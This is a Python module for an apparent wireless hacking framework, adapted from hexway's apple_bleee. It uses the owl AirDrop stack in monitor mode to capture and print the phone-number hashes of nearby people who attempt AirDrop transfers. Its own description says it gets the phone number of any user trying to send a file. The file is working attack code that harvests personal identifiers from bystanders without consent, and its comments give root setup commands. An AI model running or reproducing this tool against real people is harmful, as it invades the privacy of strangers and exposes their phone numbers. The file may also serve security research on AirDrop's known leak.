# Adapting script from https://github.com/hexway/apple_bleee
# Thanks to Dmitry Chastuhin @_chipik and https://hexway.io 
# Author: @lucferbux
from modules._module import Module
from utils.custom_print import print_info, print_ok, print_error, print_body
from utils.check_root import is_root
from utildata.dataset_options import Option
from utils.ble_apple.wireless_interface import BadInterfaceException, ModeMonitorException, OwlException, check_wifi_config
import time
import hashlib
from threading import Thread, Timer
from utils.opendrop2.cli import AirDropCli
from utils.opendrop2.server import get_devices


class HomeModule(Module):

    def __init__(self):
        information = {"Name": "Aidrop Leak",
                       "Description": "This script allows to get mobile phone number of any user who will try to send file via AirDrop",
                       "privileges": "root",
                       "OS": "Linux",
                       "Reference" : "https://github.com/hexway/apple_bleee",
                       "Author": "@lucferbux"}

        options = {
            'interval': Option.create(name="inverval", value=3, description="Seconds to refresh"),
            "iface": Option.create(name="iface", value="wlan0", description="Wireless Interface to enable monitor mode"),
        }

        # Constructor of the parent class
        super(HomeModule, self).__init__(information, options)

    # This module must be always implemented, it is called by the run option
    # 1. Install owl git clone https://github.com/seemoo-lab/owl.git && cd ./owl && git submodule update --init && mkdir build && cd build && cmake .. && make && sudo make install && cd ../..
    # 2. sudo rfkill list all
    # 3. sudo ifconfig [wlan] down
    # 4. sudo iwconfig [wlan] mode monitor
    # 5. sudo ifconfig [wlan] up
    # 6. ip link set wlan0 up
    # 7. owl -i [wlan] -N -D
    # 8. if error kill owl -- sudo kill $(sudo ps -A | grep owl | awk '{print $1}') 
    @is_root
    def run(self):
        iwdev = str(self.args.get("iface", "wlan0"))
        interval = int(self.args.get("interval", 3))

        try:
            print_info("Configuring owl interface...")
            check_wifi_config(iwdev)
            time.sleep(1.5) # time to wake up owl process
        except ModeMonitorException:
            print_error("Error, mode monitor not suported in the given interface, press ctr+c to continue")
            return
        except BadInterfaceException:
            print_error("Error, inteface not found, press ctr+c to continue")
            return
        except OwlException:
            print_error("Error, there was a problem setting up owl, press ctr+c to continue, if not insalled --> https://github.com/seemoo-lab/owl.git")
            return
        except Exception as e:
            print_error(f"Error, something went wrong configuring the interface, press ctr+c to continue --> {e}")
            return

        results = {}
        thread2 = Thread(target=self.start_listetninig, args=())
        thread2.daemon = True
        thread2.start()

        try:
            while True:
                time.sleep(interval)
                devs = get_devices()
                for dev in devs:
                    hash = dev.get("hash", None)
                    hash = hash.replace("\\x04)", "")
                    hash = hash.replace("\\x00)", "")
                    if(hash not in results.keys()):
                        results.update({hash : dev})
                        #print(f"Someone with phone number hash \033[92m{hash}\033[0m has tried to use AirDrop")
                        print(f"Someone with phone number hash {hash} has tried to use AirDrop")
        except:
            print("")
            print_error("Bye")

    def start_listetninig(self):
        print_info("[*] Looking for AirDrop senders...")
        AirDropCli(["receive"])

    def get_hash(self, data):
        return hashlib.sha256(data.encode('utf-8')).hexdigest()
